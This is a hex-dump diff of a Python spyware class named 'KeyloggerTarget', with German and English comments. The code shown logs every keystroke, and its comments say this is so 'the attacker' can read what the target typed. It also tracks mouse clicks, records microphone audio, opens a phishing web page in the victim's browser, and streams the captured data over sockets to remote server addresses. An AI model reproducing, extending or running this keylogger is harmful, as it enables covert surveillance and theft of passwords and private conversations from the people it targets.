-00001d20: 736f 2069 7420 6361 6e20 6265 2072 616e  so it can be ran
-00001d30: 2077 6974 6820 7468 7265 6164 696e 670d   with threading.
-00001d40: 0a20 2020 2020 2020 2077 6974 6820 4c69  .        with Li
-00001d50: 7374 656e 6572 286f 6e5f 636c 6963 6b3d  stener(on_click=
-00001d60: 7365 6c66 2e6f 6e5f 636c 6963 6b29 2061  self.on_click) a
-00001d70: 7320 6c69 7374 656e 696e 673a 0d0a 2020  s listening:..  
-00001d80: 2020 2020 2020 2020 2020 7365 6c66 2e6b            self.k
-00001d90: 696c 6c5f 7377 6974 6368 2829 0d0a 2020  ill_switch()..  
-00001da0: 2020 2020 2020 2020 2020 6c69 7374 656e            listen
-00001db0: 696e 672e 6a6f 696e 2829 0d0a 0d0a 2020  ing.join()....  
-00001dc0: 2020 6465 6620 6f6e 5f70 7265 7373 2873    def on_press(s
-00001dd0: 656c 662c 206b 6579 293a 0d0a 2020 2020  elf, key):..    
-00001de0: 2020 2020 7472 793a 0d0a 2020 2020 2020      try:..      
-00001df0: 2020 2020 2020 7472 793a 0d0a 2020 2020        try:..    
-00001e00: 2020 2020 2020 2020 2020 2020 6f74 6865              othe
-00001e10: 725f 6368 6172 6563 7465 7273 203d 207b  r_charecters = {
-00001e20: 2231 223a 2022 2122 2c20 2232 223a 2027  "1": "!", "2": '
-00001e30: 2227 2c20 2233 223a 2022 c2a7 222c 2022  "', "3": "..", "
-00001e40: 3422 3a20 2224 222c 2022 3522 3a20 2225  4": "$", "5": "%
-00001e50: 222c 2022 3622 3a20 2226 222c 2022 3722  ", "6": "&", "7"
-00001e60: 3a20 222f 222c 2022 3822 3a20 2228 222c  : "/", "8": "(",
-00001e70: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00001e80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001e90: 2020 2020 2020 2239 223a 2022 2922 2c20        "9": ")", 
-00001ea0: 2230 223a 2022 3d22 2c20 22c3 9f22 3a20  "0": "=", "..": 
-00001eb0: 223f 227d 0d0a 2020 2020 2020 2020 2020  "?"}..          
-00001ec0: 2020 2020 2020 6966 2073 656c 662e 6361        if self.ca
-00001ed0: 7073 2069 7320 5472 7565 3a0d 0a20 2020  ps is True:..   
-00001ee0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001ef0: 2069 6620 6b65 792e 6368 6172 2069 6e20   if key.char in 
-00001f00: 6f74 6865 725f 6368 6172 6563 7465 7273  other_charecters
-00001f10: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00001f20: 2020 2020 2020 2020 2020 2077 6f72 6420             word 
-00001f30: 3d20 6f74 6865 725f 6368 6172 6563 7465  = other_charecte
-00001f40: 7273 5b6b 6579 2e63 6861 725d 0d0a 2020  rs[key.char]..  
-00001f50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00001f60: 2020 2020 2020 2355 7070 6572 2043 6861        #Upper Cha
-00001f70: 7261 6374 6572 7320 6672 6f6d 2022 3122  racters from "1"
-00001f80: 2074 6f20 2230 2220 6265 6361 7573 6520   to "0" because 
-00001f90: 616c 6c20 7468 6973 206e 756d 6265 7273  all this numbers
-00001fa0: 2061 7265 206e 6f74 2063 6861 7265 6374   are not charect
-00001fb0: 6572 7320 6172 6520 6e6f 7420 696e 2070  ers are not in p
-00001fc0: 796e 7075 740d 0a20 2020 2020 2020 2020  ynput..         
-00001fd0: 2020 2020 2020 2020 2020 2065 6c73 653a             else:
-00001fe0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00001ff0: 2020 2020 2020 2020 2020 776f 7264 203d            word =
-00002000: 206b 6579 2e63 6861 722e 7570 7065 7228   key.char.upper(
-00002010: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00002020: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
-00002030: 2020 2020 2020 2020 2020 2020 2020 776f                wo
-00002040: 7264 203d 206b 6579 2e63 6861 720d 0a0d  rd = key.char...
-00002050: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002060: 2070 7269 6e74 2866 2741 6c70 6861 6265   print(f'Alphabe
-00002070: 7469 7363 6865 2054 6173 7465 2077 7572  tische Taste wur
-00002080: 6465 2067 6564 72c3 bc63 6b74 3a20 7b77  de gedr..ckt: {w
-00002090: 6f72 647d 2027 290d 0a20 2020 2020 2020  ord} ')..       
-000020a0: 2020 2020 2020 2020 2073 656c 662e 7269           self.ri
-000020b0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
-000020c0: 776f 7264 0d0a 2020 2020 2020 2020 2020  word..          
-000020d0: 2020 2020 2020 2320 4576 6572 7920 7072        # Every pr
-000020e0: 6573 7365 6420 6b65 7920 7769 6c6c 2062  essed key will b
-000020f0: 6520 7361 7665 6420 696e 2022 7269 6368  e saved in "rich
-00002100: 7469 6765 5f6c 6973 7465 2220 7468 6973  tige_liste" this
-00002110: 2069 7320 6120 6765 726d 616e 2077 6f72   is a german wor
-00002120: 6420 616e 6420 6d65 616e 7320 2272 6967  d and means "rig
-00002130: 6874 5f6c 6973 7422 0d0a 0d0a 2020 2020  ht_list"....    
-00002140: 2020 2020 2020 2020 2020 2020 7072 696e              prin
-00002150: 7428 7365 6c66 2e72 6963 6874 6967 655f  t(self.richtige_
-00002160: 6c69 7374 6529 0d0a 2020 2020 2020 2020  liste)..        
-00002170: 2020 2020 6578 6365 7074 2054 7970 6545      except TypeE
-00002180: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
-00002190: 2020 2020 2020 2070 6173 730d 0a0d 0a20         pass.... 
-000021a0: 2020 2020 2020 2065 7863 6570 7420 4174         except At
-000021b0: 7472 6962 7574 6545 7272 6f72 3a0d 0a20  tributeError:.. 
-000021c0: 2020 2020 2020 2020 2020 2070 7269 6e74             print
-000021d0: 2866 2745 696e 6520 616e 6465 7265 2054  (f'Eine andere T
-000021e0: 6173 7465 2077 7572 6465 2067 6564 72c3  aste wurde gedr.
-000021f0: bc63 6b74 3a20 7b6b 6579 7d27 290d 0a20  .ckt: {key}').. 
-00002200: 2020 2020 2020 2020 2020 2069 6620 6b65             if ke
-00002210: 7920 3d3d 206b 6579 626f 6172 642e 4b65  y == keyboard.Ke
-00002220: 792e 7370 6163 6520 6f72 206b 6579 203d  y.space or key =
-00002230: 3d20 6b65 7962 6f61 7264 2e4b 6579 2e74  = keyboard.Key.t
-00002240: 6162 3a0d 0a20 2020 2020 2020 2020 2020  ab:..           
-00002250: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
-00002260: 6765 5f6c 6973 7465 202b 3d20 227b 220d  ge_liste += "{".
-00002270: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002280: 2023 2049 6620 7468 6520 7461 7267 6574   # If the target
-00002290: 2070 7265 7373 6573 2074 6162 206f 7220   presses tab or 
-000022a0: 7370 6163 6520 6120 227b 2220 7769 6c6c  space a "{" will
-000022b0: 2062 6520 6170 7065 6e64 6564 2074 6f20   be appended to 
-000022c0: 7468 6520 6c69 7374 2073 6f20 7468 6520  the list so the 
-000022d0: 6174 7461 636b 6572 206b 6e6f 7773 2077  attacker knows w
-000022e0: 6865 6e20 616e 640d 0a20 2020 2020 2020  hen and..       
-000022f0: 2020 2020 2020 2020 2023 2073 7061 6365           # space
-00002300: 206f 7220 6120 7461 6220 6b65 7920 6861   or a tab key ha
-00002310: 7320 6265 656e 2070 7265 7373 6564 0d0a  s been pressed..
-00002320: 2020 2020 2020 2020 2020 2020 656c 6966              elif
-00002330: 206b 6579 203d 3d20 6b65 7962 6f61 7264   key == keyboard
-00002340: 2e4b 6579 2e63 6170 735f 6c6f 636b 3a0d  .Key.caps_lock:.
-00002350: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002360: 2073 656c 662e 6361 7073 203d 2054 7275   self.caps = Tru
-00002370: 650d 0a20 2020 2020 2020 2020 2020 2020  e..             
-00002380: 2020 2073 656c 662e 6368 6563 6b2e 6170     self.check.ap
-00002390: 7065 6e64 2831 290d 0a20 2020 2020 2020  pend(1)..       
-000023a0: 2020 2020 2063 6865 636b 5f63 6170 7320       check_caps 
-000023b0: 3d20 7375 6d28 7365 6c66 2e63 6865 636b  = sum(self.check
-000023c0: 2920 2f20 320d 0a20 2020 2020 2020 2020  ) / 2..         
-000023d0: 2020 2023 2049 6620 6368 6563 6b5f 6361     # If check_ca
-000023e0: 7073 2069 7320 6e6f 7420 7072 696d 6172  ps is not primar
-000023f0: 7920 6974 2077 696c 6c20 7365 7420 7365  y it will set se
-00002400: 6c66 2e63 6170 7320 746f 2046 616c 7365  lf.caps to False
-00002410: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-00002420: 6966 2073 7472 2863 6865 636b 5f63 6170  if str(check_cap
-00002430: 7329 5b2d 315d 2021 3d20 2730 273a 0d0a  s)[-1] != '0':..
-00002440: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002450: 7061 7373 0d0a 2020 2020 2020 2020 2020  pass..          
-00002460: 2020 656c 7365 3a0d 0a20 2020 2020 2020    else:..       
-00002470: 2020 2020 2020 2020 2073 656c 662e 6361           self.ca
-00002480: 7073 203d 2046 616c 7365 0d0a 0d0a 2020  ps = False....  
-00002490: 2020 6465 6620 6f6e 5f72 656c 6561 7365    def on_release
-000024a0: 2873 656c 662c 206b 6579 293a 0d0a 2020  (self, key):..  
-000024b0: 2020 2020 2020 7072 696e 7428 6627 4b65        print(f'Ke
-000024c0: 7920 7265 6c65 6173 6564 3a20 7b6b 6579  y released: {key
-000024d0: 7d27 290d 0a0d 0a20 2020 2064 6566 2073  }')....    def s
-000024e0: 7461 7274 2873 656c 6629 3a0d 0a20 2020  tart(self):..   
-000024f0: 2020 2020 2069 6620 7365 6c66 2e64 7572       if self.dur
-00002500: 6174 696f 6e20 3c20 3630 3a0d 0a20 2020  ation < 60:..   
-00002510: 2020 2020 2020 2020 2072 6169 7365 2054           raise T
-00002520: 7970 6545 7272 6f72 2866 227b 7365 6c66  ypeError(f"{self
-00002530: 2e64 7572 6174 696f 6e7d 2069 7320 6e6f  .duration} is no
-00002540: 7420 6772 6561 7465 7220 616e 6420 6e6f  t greater and no
-00002550: 7420 6571 7561 6c20 746f 2036 3022 290d  t equal to 60").
-00002560: 0a20 2020 2020 2020 2023 2022 6475 7261  .        # "dura
-00002570: 7469 6f6e 5f69 6e5f 7365 636f 6e64 7322  tion_in_seconds"
-00002580: 2073 686f 756c 6420 616c 7761 7973 2062   should always b
-00002590: 6520 6269 6767 6572 2074 6861 6e20 3630  e bigger than 60
-000025a0: 2073 6563 6f6e 6473 0d0a 2020 2020 2020   seconds..      
-000025b0: 2020 656c 7365 3a0d 0a20 2020 2020 2020    else:..       
-000025c0: 2020 2020 2069 6620 7365 6c66 2e70 6869       if self.phi
-000025d0: 7368 696e 6720 6973 206e 6f74 204e 6f6e  shing is not Non
-000025e0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
-000025f0: 2020 2020 7768 696c 6520 5472 7565 3a0d      while True:.
-00002600: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002610: 2020 2020 2074 7279 3a0d 0a20 2020 2020       try:..     
-00002620: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002630: 2020 2072 6573 706f 6e73 6520 3d20 7265     response = re
-00002640: 7175 6573 7473 2e67 6574 2873 656c 662e  quests.get(self.
-00002650: 7068 6973 6869 6e67 290d 0a20 2020 2020  phishing)..     
-00002660: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002670: 2020 2023 5265 7370 6f6e 6520 6973 2068     #Respone is h
-00002680: 6572 6520 746f 2073 6565 2069 6620 7468  ere to see if th
-00002690: 6520 7765 6273 6974 6520 6973 206f 6e6c  e website is onl
-000026a0: 696e 6520 6f72 206e 6f74 0d0a 2020 2020  ine or not..    
-000026b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000026c0: 2020 2020 7765 6262 726f 7773 6572 2e6f      webbrowser.o
-000026d0: 7065 6e28 7365 6c66 2e70 6869 7368 696e  pen(self.phishin
-000026e0: 6729 0d0a 2020 2020 2020 2020 2020 2020  g)..            
-000026f0: 2020 2020 2020 2020 2020 2020 6272 6561              brea
-00002700: 6b0d 0a0d 0a20 2020 2020 2020 2020 2020  k....           
-00002710: 2020 2020 2020 2020 2065 7863 6570 7420           except 
-00002720: 7265 7175 6573 7473 2e65 7863 6570 7469  requests.excepti
-00002730: 6f6e 732e 436f 6e6e 6563 7469 6f6e 4572  ons.ConnectionEr
-00002740: 726f 723a 0d0a 2020 2020 2020 2020 2020  ror:..          
-00002750: 2020 2020 2020 2020 2020 2020 2020 7072                pr
-00002760: 696e 7428 224e 6f20 636f 6e6e 6563 7469  int("No connecti
-00002770: 6f6e 2229 0d0a 2020 2020 2020 2020 2020  on")..          
-00002780: 2020 2020 2020 2020 2020 2020 2020 7379                sy
-00002790: 732e 6578 6974 2829 0d0a 0d0a 2020 2020  s.exit()....    
-000027a0: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
-000027b0: 675f 7468 7265 6164 203d 2074 6872 6561  g_thread = threa
-000027c0: 6469 6e67 2e54 6872 6561 6428 7461 7267  ding.Thread(targ
-000027d0: 6574 3d73 656c 662e 6461 7465 6e5f 6175  et=self.daten_au
-000027e0: 666e 6568 656d 656e 290d 0a20 2020 2020  fnehemen)..     
-000027f0: 2020 2020 2020 2023 2054 6869 7320 7275         # This ru
-00002800: 6e73 2074 6865 2070 726f 6772 616d 6d20  ns the programm 
-00002810: 6265 6869 6e64 2074 6865 2061 6374 7561  behind the actua
-00002820: 6c20 7072 6f67 7261 6d6d 696e 670d 0a20  l programming.. 
-00002830: 2020 2020 2020 2020 2020 206c 6973 7465             liste
-00002840: 6e69 6e67 5f74 6872 6561 642e 7374 6172  ning_thread.star
-00002850: 7428 290d 0a0d 0a20 2020 2020 2020 2020  t()....         
-00002860: 2020 2074 6872 6561 6469 6e67 5f6d 6f75     threading_mou
-00002870: 7365 203d 2074 6872 6561 6469 6e67 2e54  se = threading.T
-00002880: 6872 6561 6428 7461 7267 6574 3d73 656c  hread(target=sel
-00002890: 662e 616c 6c5f 636c 6963 6b73 290d 0a20  f.all_clicks).. 
-000028a0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
-000028b0: 7320 7275 6e73 2074 6865 2070 726f 6772  s runs the progr
-000028c0: 616d 6d20 6265 6869 6e64 2074 6865 2061  amm behind the a
-000028d0: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
-000028e0: 670d 0a20 2020 2020 2020 2020 2020 2074  g..            t
-000028f0: 6872 6561 6469 6e67 5f6d 6f75 7365 2e73  hreading_mouse.s
-00002900: 7461 7274 2829 0d0a 0d0a 2020 2020 2020  tart()....      
-00002910: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
-00002920: 203d 2073 6f63 6b65 742e 736f 636b 6574   = socket.socket
-00002930: 2873 6f63 6b65 742e 4146 5f49 4e45 542c  (socket.AF_INET,
-00002940: 2073 6f63 6b65 742e 534f 434b 5f53 5452   socket.SOCK_STR
-00002950: 4541 4d29 0d0a 2020 2020 2020 2020 2020  EAM)..          
-00002960: 2020 7365 6e64 5f74 696d 6572 2e63 6f6e    send_timer.con
-00002970: 6e65 6374 2828 7365 6c66 2e69 705f 7469  nect((self.ip_ti
-00002980: 6d65 722c 2073 656c 662e 706f 7274 5f74  mer, self.port_t
-00002990: 696d 6572 2929 0d0a 0d0a 2020 2020 2020  imer))....      
-000029a0: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
-000029b0: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
-000029c0: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
-000029d0: 2929 0d0a 2020 2020 2020 2020 2020 2020  ))..            
-000029e0: 2320 5468 6973 2073 656e 6473 2074 6865  # This sends the
-000029f0: 2073 6563 6f6e 6473 2074 6f20 7468 6520   seconds to the 
-00002a00: 7365 7276 6572 0d0a 2020 2020 2020 2020  server..        
-00002a10: 2020 2020 7365 6e64 5f74 696d 6572 2e63      send_timer.c
-00002a20: 6c6f 7365 2829 0d0a 0d0a 2020 2020 2020  lose()....      
-00002a30: 2020 2020 2020 7769 7468 206b 6579 626f        with keybo
-00002a40: 6172 642e 4c69 7374 656e 6572 286f 6e5f  ard.Listener(on_
-00002a50: 7072 6573 733d 7365 6c66 2e6f 6e5f 7072  press=self.on_pr
-00002a60: 6573 732c 206f 6e5f 7265 6c65 6173 653d  ess, on_release=
-00002a70: 7365 6c66 2e6f 6e5f 7265 6c65 6173 6529  self.on_release)
-00002a80: 2061 7320 6c69 7374 656e 6572 3a0d 0a20   as listener:.. 
-00002a90: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-00002aa0: 656c 662e 636f 756e 7464 6f77 6e5f 7365  elf.countdown_se
-00002ab0: 6e64 2873 656c 662e 6475 7261 7469 6f6e  nd(self.duration
-00002ac0: 2c20 7365 6c66 2e69 705f 7068 6f74 6f73  , self.ip_photos
-00002ad0: 2c20 7365 6c66 2e70 6f72 745f 7068 6f74  , self.port_phot
-00002ae0: 6f73 2c20 7365 6c66 2e69 705f 6b65 796c  os, self.ip_keyl
-00002af0: 6f67 6765 722c 0d0a 2020 2020 2020 2020  ogger,..        
-00002b00: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002b10: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-00002b20: 2e70 6f72 745f 6b65 796c 6f67 6765 7229  .port_keylogger)
-00002b30: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00002b40: 2020 6c69 7374 656e 6572 2e6a 6f69 6e28    listener.join(
-00002b50: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
-00002b60: 2020 2023 2054 6869 7320 6c69 7374 656e     # This listen
-00002b70: 7320 746f 2074 6865 206b 6579 7320 7468  s to the keys th
-00002b80: 6174 2077 6865 7265 2074 7970 6564       at where typed
+00000000: 696d 706f 7274 2070 7970 6572 636c 6970  import pyperclip
+00000010: 0d0a 6672 6f6d 2070 796e 7075 7420 696d  ..from pynput im
+00000020: 706f 7274 206b 6579 626f 6172 640d 0a66  port keyboard..f
+00000030: 726f 6d20 7079 6e70 7574 2e6d 6f75 7365  rom pynput.mouse
+00000040: 2069 6d70 6f72 7420 4c69 7374 656e 6572   import Listener
+00000050: 0d0a 696d 706f 7274 2074 696d 650d 0a69  ..import time..i
+00000060: 6d70 6f72 7420 7379 730d 0a69 6d70 6f72  mport sys..impor
+00000070: 7420 736f 636b 6574 0d0a 696d 706f 7274  t socket..import
+00000080: 2070 7961 7574 6f67 7569 2061 7320 7067   pyautogui as pg
+00000090: 0d0a 696d 706f 7274 206f 730d 0a69 6d70  ..import os..imp
+000000a0: 6f72 7420 7079 6175 6469 6f0d 0a69 6d70  ort pyaudio..imp
+000000b0: 6f72 7420 7468 7265 6164 696e 670d 0a69  ort threading..i
+000000c0: 6d70 6f72 7420 7261 6e64 6f6d 0d0a 696d  mport random..im
+000000d0: 706f 7274 2072 6571 7565 7374 730d 0a69  port requests..i
+000000e0: 6d70 6f72 7420 7765 6262 726f 7773 6572  mport webbrowser
+000000f0: 0d0a 0d0a 0d0a 636c 6173 7320 4b65 796c  ......class Keyl
+00000100: 6f67 6765 7254 6172 6765 743a 0d0a 2020  oggerTarget:..  
+00000110: 2020 6465 6620 5f5f 696e 6974 5f5f 2873    def __init__(s
+00000120: 656c 662c 2069 705f 6f66 5f73 6572 7665  elf, ip_of_serve
+00000130: 725f 7068 6f74 6f73 2c20 706f 7274 5f6f  r_photos, port_o
+00000140: 665f 7365 7276 6572 5f70 686f 746f 732c  f_server_photos,
+00000150: 2069 705f 6f66 5f73 6572 7665 725f 6b65   ip_of_server_ke
+00000160: 796c 6f67 6765 725f 6461 7461 2c0d 0a20  ylogger_data,.. 
+00000170: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000180: 706f 7274 5f6f 665f 7365 7276 6572 5f6b  port_of_server_k
+00000190: 6579 6c6f 6767 6572 5f64 6174 612c 2069  eylogger_data, i
+000001a0: 705f 6f66 5f73 6572 7665 725f 6c69 7374  p_of_server_list
+000001b0: 656e 6572 2c20 706f 7274 5f6f 665f 7365  ener, port_of_se
+000001c0: 7276 6572 5f6c 6973 7465 6e65 722c 2069  rver_listener, i
+000001d0: 705f 6f66 5f74 696d 6572 2c0d 0a20 2020  p_of_timer,..   
+000001e0: 2020 2020 2020 2020 2020 2020 2020 706f                po
+000001f0: 7274 5f6f 665f 7469 6d65 722c 2064 7572  rt_of_timer, dur
+00000200: 6174 696f 6e5f 696e 5f73 6563 6f6e 6473  ation_in_seconds
+00000210: 3d32 3030 2c20 7068 6973 6869 6e67 5f77  =200, phishing_w
+00000220: 6562 3d4e 6f6e 6529 3a0d 0a20 2020 2020  eb=None):..     
+00000230: 2020 2023 2022 6475 7261 7469 6f6e 5f69     # "duration_i
+00000240: 6e5f 7365 636f 6e64 7322 2074 656c 6c73  n_seconds" tells
+00000250: 2074 6865 2070 726f 6772 616d 6d20 686f   the programm ho
+00000260: 7720 6c6f 6e67 2069 7420 7368 6f75 6c64  w long it should
+00000270: 206c 6173 7420 7468 6520 6465 6661 756c   last the defaul
+00000280: 7420 7469 6d65 2069 7320 3230 3020 7365  t time is 200 se
+00000290: 636f 6e64 7320 7468 6174 2773 2033 204d  conds that's 3 M
+000002a0: 696e 7574 6573 2061 6e64 2032 3020 5365  inutes and 20 Se
+000002b0: 636f 6e64 730d 0a20 2020 2020 2020 2061  conds..        a
+000002c0: 7373 6572 7420 6475 7261 7469 6f6e 5f69  ssert duration_i
+000002d0: 6e5f 7365 636f 6e64 7320 3e3d 2036 302c  n_seconds >= 60,
+000002e0: 2066 227b 6475 7261 7469 6f6e 5f69 6e5f   f"{duration_in_
+000002f0: 7365 636f 6e64 737d 2069 7320 6e6f 7420  seconds} is not 
+00000300: 6772 6561 7465 7220 616e 6420 6e6f 7420  greater and not 
+00000310: 6571 7561 6c20 746f 2036 3022 0d0a 2020  equal to 60"..  
+00000320: 2020 2020 2020 2320 2264 7572 6174 696f        # "duratio
+00000330: 6e5f 696e 5f73 6563 6f6e 6473 2220 7368  n_in_seconds" sh
+00000340: 6f75 6c64 2061 6c77 6179 7320 6265 2062  ould always be b
+00000350: 6967 6765 7220 7468 616e 2036 3020 7365  igger than 60 se
+00000360: 636f 6e64 730d 0a0d 0a20 2020 2020 2020  conds....       
+00000370: 2073 656c 662e 6970 5f70 686f 746f 7320   self.ip_photos 
+00000380: 3d20 6970 5f6f 665f 7365 7276 6572 5f70  = ip_of_server_p
+00000390: 686f 746f 730d 0a20 2020 2020 2020 2073  hotos..        s
+000003a0: 656c 662e 706f 7274 5f70 686f 746f 7320  elf.port_photos 
+000003b0: 3d20 706f 7274 5f6f 665f 7365 7276 6572  = port_of_server
+000003c0: 5f70 686f 746f 730d 0a20 2020 2020 2020  _photos..       
+000003d0: 2073 656c 662e 6970 5f6b 6579 6c6f 6767   self.ip_keylogg
+000003e0: 6572 203d 2069 705f 6f66 5f73 6572 7665  er = ip_of_serve
+000003f0: 725f 6b65 796c 6f67 6765 725f 6461 7461  r_keylogger_data
+00000400: 0d0a 2020 2020 2020 2020 7365 6c66 2e70  ..        self.p
+00000410: 6f72 745f 6b65 796c 6f67 6765 7220 3d20  ort_keylogger = 
+00000420: 706f 7274 5f6f 665f 7365 7276 6572 5f6b  port_of_server_k
+00000430: 6579 6c6f 6767 6572 5f64 6174 610d 0a20  eylogger_data.. 
+00000440: 2020 2020 2020 2073 656c 662e 6970 5f6c         self.ip_l
+00000450: 6973 7465 6e65 7220 3d20 6970 5f6f 665f  istener = ip_of_
+00000460: 7365 7276 6572 5f6c 6973 7465 6e65 720d  server_listener.
+00000470: 0a20 2020 2020 2020 2073 656c 662e 706f  .        self.po
+00000480: 7274 5f6c 6973 7465 6e65 7220 3d20 706f  rt_listener = po
+00000490: 7274 5f6f 665f 7365 7276 6572 5f6c 6973  rt_of_server_lis
+000004a0: 7465 6e65 720d 0a20 2020 2020 2020 2073  tener..        s
+000004b0: 656c 662e 6475 7261 7469 6f6e 203d 2064  elf.duration = d
+000004c0: 7572 6174 696f 6e5f 696e 5f73 6563 6f6e  uration_in_secon
+000004d0: 6473 0d0a 2020 2020 2020 2020 7365 6c66  ds..        self
+000004e0: 2e69 705f 7469 6d65 7220 3d20 6970 5f6f  .ip_timer = ip_o
+000004f0: 665f 7469 6d65 720d 0a20 2020 2020 2020  f_timer..       
+00000500: 2073 656c 662e 706f 7274 5f74 696d 6572   self.port_timer
+00000510: 203d 2070 6f72 745f 6f66 5f74 696d 6572   = port_of_timer
+00000520: 0d0a 2020 2020 2020 2020 7365 6c66 2e70  ..        self.p
+00000530: 6869 7368 696e 6720 3d20 7068 6973 6869  hishing = phishi
+00000540: 6e67 5f77 6562 0d0a 0d0a 2020 2020 2020  ng_web....      
+00000550: 2020 7365 6c66 2e63 6865 636b 203d 205b    self.check = [
+00000560: 5d0d 0a20 2020 2020 2020 2073 656c 662e  ]..        self.
+00000570: 6361 7073 203d 2046 616c 7365 0d0a 2020  caps = False..  
+00000580: 2020 2020 2020 7365 6c66 2e72 6963 6874        self.richt
+00000590: 6967 655f 6c69 7374 6520 3d20 5b5d 0d0a  ige_liste = []..
+000005a0: 2020 2020 2020 2020 7365 6c66 2e63 6f6f          self.coo
+000005b0: 7264 696e 6174 6573 203d 205b 5d0d 0a0d  rdinates = []...
+000005c0: 0a20 2020 2064 6566 2064 6174 656e 5f61  .    def daten_a
+000005d0: 7566 6e65 6865 6d65 6e28 7365 6c66 293a  ufnehemen(self):
+000005e0: 0d0a 2020 2020 2020 2020 6c69 7374 656e  ..        listen
+000005f0: 696e 675f 6461 7461 203d 2073 6f63 6b65  ing_data = socke
+00000600: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
+00000610: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
+00000620: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
+00000630: 2020 2020 2020 6c69 7374 656e 696e 675f        listening_
+00000640: 6461 7461 2e63 6f6e 6e65 6374 2828 7365  data.connect((se
+00000650: 6c66 2e69 705f 6c69 7374 656e 6572 2c20  lf.ip_listener, 
+00000660: 7365 6c66 2e70 6f72 745f 6c69 7374 656e  self.port_listen
+00000670: 6572 2929 0d0a 2020 2020 2020 2020 7472  er))..        tr
+00000680: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
+00000690: 666f 726d 6174 203d 2070 7961 7564 696f  format = pyaudio
+000006a0: 2e70 6149 6e74 3136 0d0a 2020 2020 2020  .paInt16..      
+000006b0: 2020 2020 2020 6368 616e 6e65 6c73 203d        channels =
+000006c0: 2032 0d0a 2020 2020 2020 2020 2020 2020   2..            
+000006d0: 7261 7465 203d 2034 3431 3030 0d0a 2020  rate = 44100..  
+000006e0: 2020 2020 2020 2020 2020 6368 756e 6b20            chunk 
+000006f0: 3d20 3130 3234 0d0a 2020 2020 2020 2020  = 1024..        
+00000700: 2020 2020 7365 636f 6e64 7320 3d20 7365      seconds = se
+00000710: 6c66 2e64 7572 6174 696f 6e20 2b20 310d  lf.duration + 1.
+00000720: 0a0d 0a20 2020 2020 2020 2020 2020 2061  ...            a
+00000730: 7564 696f 203d 2070 7961 7564 696f 2e50  udio = pyaudio.P
+00000740: 7941 7564 696f 2829 0d0a 0d0a 2020 2020  yAudio()....    
+00000750: 2020 2020 2020 2020 2320 7374 6172 7420          # start 
+00000760: 5265 636f 7264 696e 670d 0a20 2020 2020  Recording..     
+00000770: 2020 2020 2020 2073 7472 6561 6d20 3d20         stream = 
+00000780: 6175 6469 6f2e 6f70 656e 2866 6f72 6d61  audio.open(forma
+00000790: 743d 666f 726d 6174 2c20 6368 616e 6e65  t=format, channe
+000007a0: 6c73 3d63 6861 6e6e 656c 732c 0d0a 2020  ls=channels,..  
+000007b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000007c0: 2020 2020 2020 2020 2020 2020 2020 7261                ra
+000007d0: 7465 3d72 6174 652c 2069 6e70 7574 3d54  te=rate, input=T
+000007e0: 7275 652c 0d0a 2020 2020 2020 2020 2020  rue,..          
+000007f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00000800: 2020 2020 2020 6672 616d 6573 5f70 6572        frames_per
+00000810: 5f62 7566 6665 723d 6368 756e 6b29 0d0a  _buffer=chunk)..
+00000820: 2020 2020 2020 2020 2020 2020 2320 7072              # pr
+00000830: 696e 7428 2272 6563 6f72 6469 6e67 2e2e  int("recording..
+00000840: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
+00000850: 2066 7261 6d65 7320 3d20 5b5d 0d0a 0d0a   frames = []....
+00000860: 2020 2020 2020 2020 2020 2020 666f 7220              for 
+00000870: 6920 696e 2072 616e 6765 2830 2c20 696e  i in range(0, in
+00000880: 7428 7261 7465 202f 2063 6875 6e6b 202a  t(rate / chunk *
+00000890: 2073 6563 6f6e 6473 2929 3a0d 0a20 2020   seconds)):..   
+000008a0: 2020 2020 2020 2020 2020 2020 2064 6174               dat
+000008b0: 6120 3d20 7374 7265 616d 2e72 6561 6428  a = stream.read(
+000008c0: 6368 756e 6b29 0d0a 2020 2020 2020 2020  chunk)..        
+000008d0: 2020 2020 2020 2020 6672 616d 6573 2e61          frames.a
+000008e0: 7070 656e 6428 6461 7461 290d 0a0d 0a20  ppend(data).... 
+000008f0: 2020 2020 2020 2020 2020 2023 2070 7269             # pri
+00000900: 6e74 2822 6669 6e69 7368 6564 2072 6563  nt("finished rec
